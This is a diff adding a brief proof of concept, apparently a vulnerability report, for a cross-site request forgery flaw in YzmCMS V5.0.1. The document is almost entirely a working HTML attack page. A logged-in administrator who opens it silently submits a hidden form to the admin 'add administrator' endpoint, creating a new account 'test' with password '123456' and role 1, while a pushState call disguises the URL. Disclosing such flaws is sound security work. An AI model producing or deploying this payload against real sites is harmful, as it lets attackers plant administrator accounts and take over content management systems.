@@ -1,0 +1,21 @@
+After the administrator logged in, open the following  page
+poc：
+admin/admin_manage/add.html  -------- add administrator
+
+
+<html>
+  <body>
+  <script>history.pushState('', '', '/')</script>
+    <form action="http://10.10.10.39:8080/CMS/YzmCMS-V5.0.1/admin/admin_manage/add.html" method="POST">
+      <input type="hidden" name="adminname" value="test" />
+      <input type="hidden" name="password" value="123456" />
+      <input type="hidden" name="password2" value="123456" />
+      <input type="hidden" name="email" value="" />
+      <input type="hidden" name="realname" value="" />
+      <input type="hidden" name="roleid" value="1" />
+      <input type="hidden" name="token" value="yWzL8Y" />
+      <input type="hidden" name="dosubmit" value="1" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
